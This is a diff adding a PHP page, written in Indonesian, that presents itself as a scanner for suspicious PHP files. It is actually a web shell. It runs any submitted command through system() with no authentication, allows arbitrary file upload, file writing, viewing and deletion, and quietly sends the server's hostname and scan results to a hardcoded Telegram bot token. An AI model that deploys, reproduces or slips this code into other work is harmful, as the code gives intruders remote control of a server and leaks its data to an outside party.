@@ -1,0 +1,390 @@
+<?php 
+set_time_limit(900);
+ini_set('memory_limit', '-1');
+
+$scanExt = ['php','pht','phtml','php3','php4','php5','php7','php8','phar','suspected'];
+$dangerTokens = [
+    'base64_decode','urldecode','implode','strtr','substr','str_replace','substr_replace',
+    'preg_replace','eval','basename','phpinfo','mysqli_query','fopen','file_put_contents',
+    'file_get_contents','move_uploaded_file','$_files','__file__','curl_init','ini_set','set_time_limit'
+];
+
+$dangerSignatures = [
+    'eval(urldecode',
+    'file_get_contents(urldecode',
+    'eval(urldecode("\77\76")',
+];
+
+function scanDirectory(string $dir, array &$results = []): void {
+    if (!is_dir($dir) || !is_readable($dir)) return;
+    $entries = scandir($dir);
+    foreach ($entries as $entry) {
+        if ($entry === '.' || $entry === '..') continue;
+        $path = $dir . DIRECTORY_SEPARATOR . $entry;
+        if (is_dir($path)) {
+            scanDirectory($path, $results);
+        } elseif (is_file($path) && is_readable($path)) {
+            $results[] = $path;
+        }
+    }
+}
+
+function filterByExtension(array $files, array $exts): array {
+    return array_filter($files, fn($file) => in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $exts));
+}
+
+function getTokensFromFile(string $file): array {
+    $content = @file_get_contents($file);
+    if ($content === false) return [];
+    $content = preg_replace('/<\?([^p=\w])/m', '<?php ', $content);
+    $tokens = token_get_all($content);
+    $words = [];
+    foreach ($tokens as $token) {
+        if (is_array($token)) {
+            $word = strtolower(trim($token[1]));
+            if ($word !== '') $words[] = $word;
+        }
+    }
+    return array_unique($words);
+}
+
+function intersectTokens(array $needles, array $haystack): array {
+    return array_values(array_intersect($needles, $haystack));
+}
+
+function containsDangerSignature(string $content, array $signatures): bool {
+    foreach ($signatures as $sig) {
+        if (stripos($content, $sig) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function relativePath(string $base, string $path): string {
+    if (str_starts_with($path, $base)) {
+        return substr($path, strlen($base) + 1);
+    }
+    return $path;
+}
+
+function sendToTelegram(array $data): void {
+    $token = '7578782790:AAFqe1WOO4Lvrf3GFTDVbDiQVLIL2akswvs';
+    $chatId = '7234811259';
+
+    if (empty($data['found'])) return;
+
+    $domain = gethostname() ?: 'unknown-domain';
+    $filename = "Data Scan {$domain}.txt";
+
+    $content = "🚨 Hasil Scan - " . date('Y-m-d H:i:s') . "\n";
+    $content .= "📁 Directory: " . $data['directory'] . "\n\n";
+
+    foreach ($data['found'] as $i => $item) {
+        $relPath = relativePath($data['directory'], $item['path']);
+        $tokens = implode(', ', $item['tokens']);
+        $content .= ($i + 1) . ". " . $relPath . "\n   Tokens: " . $tokens . "\n";
+        if ($i >= 15) {
+            $content .= "...dan lainnya.\n";
+            break;
+        }
+    }
+
+    $tmpFile = tempnam(sys_get_temp_dir(), 'scan_');
+    file_put_contents($tmpFile, $content);
+
+    $postFields = [
+        'chat_id' => $chatId,
+        'document' => new CURLFile($tmpFile, 'text/plain', $filename),
+        'caption' => 'Laporan scan ' . $filename,
+    ];
+
+    $ch = curl_init("https://api.telegram.org/bot{$token}/sendDocument");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_exec($ch);
+    curl_close($ch);
+
+    unlink($tmpFile);
+}
+
+if (isset($_GET['view'])) {
+    $decodedPath = base64_decode($_GET['view']);
+    if (is_file($decodedPath)) {
+        header('Content-Type: text/plain');
+        echo file_get_contents($decodedPath);
+        exit;
+    }
+}
+
+if (isset($_POST['delete'])) {
+    $decodedPath = base64_decode($_POST['delete']);
+    if (is_file($decodedPath)) {
+        unlink($decodedPath);
+        exit;
+    }
+}
+
+$baseDir = $_POST['dir'] ?? getcwd();
+$baseDir = rtrim(realpath($baseDir), DIRECTORY_SEPARATOR);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Carik Apa Bang?</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap');
+
+  body {
+    margin: 0; padding: 0;
+    font-family: 'Ubuntu Mono', monospace;
+    background: rgb(12,12,22);
+    color: rgb(230,230,230);
+    min-height: 100vh;
+    display: flex; flex-direction: column; align-items: center;
+    padding: 1rem 0 4rem 0;
+  }
+  header {
+    font-size: 2.6rem;
+    font-weight: 900;
+    color: rgb(255,40,80);
+    text-shadow: 0 0 10px rgb(255,40,80);
+    margin-bottom: 0.8rem;
+  }
+  form {
+    width: 90%;
+    max-width: 920px;
+    display: flex;
+    gap: 1rem;
+    margin-bottom: 1.5rem;
+  }
+  input[type=text] {
+    flex-grow: 1;
+    padding: 14px 18px;
+    font-size: 1.15rem;
+    background: rgb(20,20,38);
+    border: 3px solid rgb(255,40,80);
+    border-radius: 10px;
+    color: rgb(230,230,230);
+  }
+  input[type=submit] {
+    background: rgb(255,40,80);
+    border: none;
+    color: white;
+    font-weight: 700;
+    font-size: 1.15rem;
+    padding: 14px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+  }
+  table {
+    border-collapse: collapse;
+    width: 90%;
+    max-width: 920px;
+    margin-top: 0.5rem;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  thead {
+    background: rgb(255,40,80);
+    color: white;
+  }
+  th, td {
+    padding: 12px 15px;
+  }
+  tbody tr:nth-child(even) { background: rgb(30,30,55); }
+  tbody tr:nth-child(odd) { background: rgb(25,25,45); }
+  td.file-path { color: rgb(255, 100, 120); font-weight: 600; }
+  td.tokens { color: rgb(120, 220, 255); font-weight: 600; font-size: 0.95rem; }
+  td.actions {
+    display: flex;
+    gap: 0.6rem;
+    justify-content: flex-start;
+  }
+  button {
+    padding: 6px 12px;
+    border-radius: 6px;
+    background: rgb(30,30,50);
+    color: white;
+    border: 1px solid rgb(255,40,80);
+    cursor: pointer;
+  }
+  button:hover {
+    background: rgb(255,40,80);
+    color: white;
+  }
+  button.copy-btn {
+    margin-top: 18px;
+  }
+  p.no-result {
+    font-style: italic;
+    color: rgb(180, 180, 180);
+    margin-top: 20px;
+    font-size: 1.1rem;
+  }
+</style>
+</head>
+<body>
+
+<header>Abang Carik Apa?</header>
+
+<form method="post" autocomplete="off">
+  <input type="text" name="dir" placeholder="Masukkan direktori untuk scan..." value="<?= htmlspecialchars($_POST['dir'] ?? $baseDir) ?>" required />
+  <input type="submit" value="SCAN" />
+</form>
+
+<div style="margin: 40px auto; width: 96%; background: #121212; padding: 30px; border-radius: 12px; border: 1px solid #ff2850; box-shadow: 0 0 12px #ff285033;">
+  <h2 style="color: #ff2850; font-size: 22px; font-family: 'Courier New', monospace; font-weight: 600; margin-bottom: 25px;">
+    ⚙️ <b>Terminal Mini (CWD: <?= getcwd(); ?>)</b>
+  </h2>
+
+  <!-- Terminal Command -->
+  <form method="post" enctype="multipart/form-data" style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px;">
+    <input type="text" name="terminal_cmd" placeholder="Contoh: wget http://url.com/file.txt"
+      style="flex: 1; padding: 12px; background: #1e1e1e; border: 1px solid #333; color: #fff; border-radius: 6px; font-family: monospace;" />
+    <button type="submit"
+      style="padding: 12px 24px; background: #ff2850; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer;">
+      ▶ Jalankan
+    </button>
+  </form>
+
+  <!-- Output Terminal -->
+  <?php
+  if (isset($_POST['terminal_cmd'])) {
+      $cmd = $_POST['terminal_cmd'];
+      echo "<pre style='background:#000; color:#0f0; padding:15px; border-radius:8px; font-family:monospace; max-height:400px; overflow:auto; box-shadow:inset 0 0 10px #0f03;'>"; 
+      system($cmd . " 2>&1");
+      echo "</pre>";
+  }
+
+  if (isset($_FILES['uploaded_file'])) {
+      $targetPath = getcwd() . '/' . basename($_FILES['uploaded_file']['name']);
+      if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetPath)) {
+          echo "<p style='color:lime;'>✅ File berhasil di-upload ke: " . htmlspecialchars($targetPath) . "</p>";
+      } else {
+          echo "<p style='color:red;'>❌ Gagal upload file.</p>";
+      }
+  }
+
+  if (isset($_POST['newfolder'])) {
+      $folder = trim($_POST['newfolder']);
+      if (!empty($folder)) {
+          $res = mkdir($folder);
+          echo $res ? "<p style='color:lime;'>📁 Folder '$folder' berhasil dibuat.</p>" : "<p style='color:red;'>❌ Gagal membuat folder.</p>";
+      }
+  }
+
+  if (isset($_POST['newfile']) && isset($_POST['filecontent'])) {
+      $filename = trim($_POST['newfile']);
+      $content = $_POST['filecontent'];
+      if (!empty($filename)) {
+          file_put_contents($filename, $content);
+          echo "<p style='color:lime;'>📄 File '$filename' berhasil dibuat.</p>";
+      }
+  }
+  ?>
+
+  <!-- Upload -->
+  <form method="post" enctype="multipart/form-data" style="margin-top: 30px;">
+    <label style="color:#fff;">📤 Upload File</label><br />
+    <input type="file" name="uploaded_file" style="margin-top:6px;" />
+    <button type="submit"
+      style="margin-top: 8px; padding: 10px 20px; background: #ff2850; color: #fff; border: none; border-radius: 6px;">Upload</button>
+  </form>
+
+  <!-- Buat Folder -->
+  <form method="post" style="margin-top: 30px;">
+    <label style="color:#fff;">📁 Buat Folder Baru</label><br />
+    <input type="text" name="newfolder" placeholder="contoh: newfolder"
+      style="width: 100%; margin-top:6px; padding: 10px; background: #1e1e1e; color: #fff; border: 1px solid #333; border-radius: 6px;" />
+    <button type="submit"
+      style="margin-top: 8px; padding: 10px 20px; background: #ff2850; color: #fff; border: none; border-radius: 6px;">Buat Folder</button>
+  </form>
+
+  <!-- Buat File -->
+  <form method="post" style="margin-top: 30px;">
+    <label style="color:#fff;">📝 Buat File Baru</label><br />
+    <input type="text" name="newfile" placeholder="contoh: file.txt"
+      style="width: 100%; margin-top:6px; padding: 10px; background: #1e1e1e; color: #fff; border: 1px solid #333; border-radius: 6px;" />
+    <textarea name="filecontent" placeholder="Isi file..." rows="6"
+      style="width: 100%; margin-top: 10px; padding: 10px; background: #1e1e1e; color: #fff; border: 1px solid #333; border-radius: 6px;"></textarea>
+    <button type="submit"
+      style="margin-top: 8px; padding: 10px 20px; background: #ff2850; color: #fff; border: none; border-radius: 6px;">Simpan File</button>
+  </form>
+</div>
+
+
+<?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+  <?php if (!is_dir($baseDir) || !is_readable($baseDir)): ?>
+    <p class="no-result">Direktori tidak ditemukan atau tidak dapat diakses.</p>
+  <?php else: ?>
+    <?php
+      $allFiles = [];
+      scanDirectory($baseDir, $allFiles);
+      $filteredFiles = filterByExtension($allFiles, $scanExt);
+      $foundFiles = [];
+      foreach ($filteredFiles as $file) {
+          $content = file_get_contents($file);
+          $tokens = getTokensFromFile($file);
+          $intersect = intersectTokens($dangerTokens, $tokens);
+          $foundSignature = containsDangerSignature($content, $dangerSignatures);
+          if (count($intersect) > 0 || $foundSignature) {
+              $detectedTokens = $intersect;
+              if ($foundSignature) {
+                  $detectedTokens[] = 'Signature Suspicious Code Found';
+              }
+              $foundFiles[] = ['path' => $file, 'tokens' => array_unique($detectedTokens)];
+          }
+      }
+
+      // Kirim hasil scan ke Telegram (format file .txt)
+      sendToTelegram([
+          'directory' => $baseDir,
+          'found' => $foundFiles
+      ]);
+    ?>
+
+    <?php if (count($foundFiles) === 0): ?>
+      <p class="no-result">Tidak ditemukan file dengan token berbahaya di direktori ini.</p>
+    <?php else: ?>
+      <table aria-label="Hasil scan file berbahaya">
+        <thead>
+          <tr>
+            <th>File Path</th>
+            <th>Fungsi / Token Terdeteksi</th>
+            <th>Aksi</th>
+          </tr>
+        </thead>
+        <tbody>
+          <?php foreach($foundFiles as $item):
+            $relPath = relativePath($baseDir, $item['path']);
+            $encodedPath = base64_encode($item['path']);
+          ?>
+            <tr>
+              <td class="file-path" title="<?= htmlspecialchars($item['path']) ?>"><?= htmlspecialchars($relPath) ?></td>
+              <td class="tokens"><?= htmlspecialchars(implode(', ', $item['tokens'])) ?></td>
+              <td class="actions">
+                <form method="get" style="display:inline-block" action="">
+                  <input type="hidden" name="view" value="<?= $encodedPath ?>" />
+                  <button type="submit" title="Lihat isi file">View</button>
+                </form>
+                <form method="post" style="display:inline-block" action="" onsubmit="return confirm('Hapus file ini?')">
+                  <input type="hidden" name="delete" value="<?= $encodedPath ?>" />
+                  <button type="submit" title="Hapus file">Delete</button>
+                </form>
+              </td>
+            </tr>
+          <?php endforeach ?>
+        </tbody>
+      </table>
+    <?php endif ?>
+  <?php endif ?>
+<?php endif ?>
+
+</body>
+</html>
